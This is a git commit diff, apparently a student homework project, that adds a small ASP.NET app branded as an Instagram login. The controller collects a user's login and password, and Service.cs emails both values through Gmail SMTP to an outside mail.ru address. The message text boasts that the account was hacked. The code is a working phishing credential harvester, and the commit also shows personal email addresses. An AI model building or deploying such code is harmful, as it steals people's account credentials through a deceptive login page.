dfe0e2a18f2d4c7a578063da5fb1b8eb24a2c3ed
alexandronischenko <alexandr.onischenko.2003@gmail.com>
2021-09-30 17:26:02 +0300

    Finished homework (instagram + api + mail)

---
+++ Instagram-API/Controllers/HomeController.cs
@@ -0,0 +1,56 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Threading.Tasks;
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
+using Instagram_API.Models;
+
+namespace Instagram_API.Controllers
+{
+    public class HomeController : Controller
+    {
+        private readonly ILogger<HomeController> _logger;
+        private readonly Service service;
+
+        public HomeController(ILogger<HomeController> logger, Service service)
+        {
+            _logger = logger;
+            this.service = service;
+        }
+
+        public IActionResult Index()
+        {
+            return View();
+        }
+
+        [HttpGet]
+        public IActionResult SendMail()
+        {
+            return View();
+        }
+
+        [HttpPost]
+        public IActionResult SendMail(string login, string password)
+        {
+            service.SendEmail(login, password);
+            //string authData = $"Login: {login}   Password: {password}";
+            
+            return RedirectToAction("Index");
+        }
+
+        //public IActionResult SendMail()
+        //{
+        //    service.SendEmail();
+        //    //return Content(authData);
+        //    return RedirectToAction("Index");
+        //}
+
+        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
+        public IActionResult Error()
+        {
+            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
+        }
+    }
+}
---
+++ Instagram-API/Service.cs
@@ -0,0 +1,47 @@
+﻿using System;
+using Microsoft.Extensions.Logging;
+using MimeKit;
+
+namespace Instagram_API
+{
+    public class Service
+    {
+        private readonly ILogger<Service> logger;
+
+        public Service(ILogger<Service> logger)
+        {
+            this.logger = logger;
+        }
+
+        public void SendEmail(string login, string password)
+        {
+            try
+            {
+                MimeMessage message = new MimeMessage();
+                message.From.Add(new MailboxAddress("Моя компания", "alexandr.onischenko.2003@gmail.com"));
+                message.To.Add(new MailboxAddress("alexandr_oni@mail.ru"));
+                message.Subject = "Взлом жопы";
+                message.Body = new BodyBuilder()
+                {
+                    HtmlBody = $"<div style=\"color: green;\">Взломали вот твой пароль и логин: {login} {password}</div>"
+                }.ToMessageBody();
+
+                using (MailKit.Net.Smtp.SmtpClient client = new MailKit.Net.Smtp.SmtpClient())
+                {
+                    client.Connect("smtp.gmail.com", 465, true);
+                    client.Authenticate("ПОЧТА С КОТОРОЙ ОТПРАВЯЛЕТСЯ СООБЩЕНИЕ", "ПАРОООООЛЬ ОТ ЭТОЙ ПОЧТЫ");
+                    client.Send(message);
+
+                    client.Disconnect(true);
+                    logger.LogInformation("Сообщение отправлено успешно!");
+                }
+
+            }
+            catch (Exception e)
+            {
+                logger.LogError(e.GetBaseException().Message);
+            }
+        }
+    }
+}
+
